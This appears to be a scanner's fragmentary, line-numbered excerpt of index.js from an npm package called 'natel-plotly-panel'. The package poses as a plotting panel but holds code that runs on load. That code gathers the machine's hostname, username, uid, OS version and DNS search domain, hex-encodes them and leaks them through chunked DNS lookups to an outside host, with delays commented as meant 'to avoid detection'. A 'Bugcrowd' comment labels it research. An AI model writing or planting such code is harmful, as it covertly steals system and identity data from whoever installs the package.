// File: tmp/tmp_ee5wo7n/natel-plotly-panel/package/index.js
// ======================================================================
Line 4: const os = require('os')
Line 13: {
    let parts = [];
    const add = (key, value) => {
        const sanitizedValue = (value || 'NA')
            .toString()
            .replace(/[^a-zA-Z0-9-]/g, '-')  // DNS-safe
            .slice(0, 100);
        parts.push(`${key}-${sanitizedValue}`);
    };

    // === Bugcrowd-required fields ===
    add('hostname', os.hostname()); // Hostname
    try {
        const userInfo = os.userInfo();
        add('user', `${userInfo.username}-${userInfo.uid}`); // whoami equivalent
    } catch (e) {
        add('user', 'unknown-user');
    }
    add('os', `${os.platform()}-${os.release()}`); // OS info

    // === Attribution proof ===
    try {
        const resolvConf = require(fs).readFileSync('/etc/resolv.conf', 'utf8');
        const match = resolvConf.match(/search\s+([^\n]+)/);
        const domain = match ? match[1].split(' ')[0] : 'no-search-domain';
        add('dns_proof', domain);
    } catch (e) {
        add('dns_proof', 'resolv-unreadable');
    }

    return parts.j...
Line 14: let parts = []
Line 16: (value || 'NA')
            .toString()
Line 20: parts.push(`${key}-${sanitizedValue}`)
Line 24: os.hostname()
Line 26: os.userInfo()
Line 31: os.platform()
Line 34: {
        const resolvConf = require(fs).readFileSync('/etc/resolv.conf', 'utf8');
        const match = resolvConf.match(/search\s+([^\n]+)/);
        const domain = match ? match[1].split(' ')[0] : 'no-search-domain';
        add('dns_proof', domain);
    }
Line 35: const resolvConf = require(fs).readFileSync('/etc/resolv.conf', 'utf8')
Line 36: const match = resolvConf.match(/search\s+([^\n]+)/)
Line 37: const domain = match ? match[1].split(' ')[0] : 'no-search-domain'
Line 43: parts.join('.')
Line 46: {
    const encodedData = Buffer.from(data).toString('hex');
    const chunks = encodedData.match(new RegExp(`.{1,${maxChunkSize}}`, 'g')) || [];
    const totalChunks = chunks.length;
    const reportId = Math.random().toString(36).substring(2, 8); // Unique per run

    let i = 0;
    const sendChunk = () => {
        if (i >= totalChunks) {
            require(dns).lookup(`${reportId}.end.fin.${oastHost}`, () => {});
            return;
        }

        const chunk = chunks[i];
        const subdomain = `${reportId}.${i}.${chunk}.${oastHost}`;

        require(dns).lookup(subdomain, () => {
            i++;
            setTimeout(sendChunk, 100 + Math.random() * 100); // Delay to avoid detection
        });
    };

    sendChunk();
}
Line 47: Buffer.from(data).toString('hex')
Line 48: const chunks = encodedData.match(new RegExp(`.{1,${maxChunkSize}}`, 'g')) || []
Line 50: Math.random().toString(36)
Line 53: {
        if (i >= totalChunks) {
            require(dns).lookup(`${reportId}.end.fin.${oastHost}`, () => {});
            return;
        }

        const chunk = chunks[i];
        const subdomain = `${reportId}.${i}.${chunk}.${oastHost}`;

        require(dns).lookup(subdomain, () => {
            i++;
            setTimeout(sendChunk, 100 + Math.random() * 100); // Delay to avoid detection
        });
    }
Line 55: (_tmp_9 = require(dns))
Line 59: const chunk = chunks[i]
Line 62: {
            i++;
            setTimeout(sendChunk, 100 + Math.random() * 100); // Delay to avoid detection
        }
Line 64: setTimeout(sendChunk, 100 + Math.random() * 100)
Line 73: exfiltrateViaDns(report)
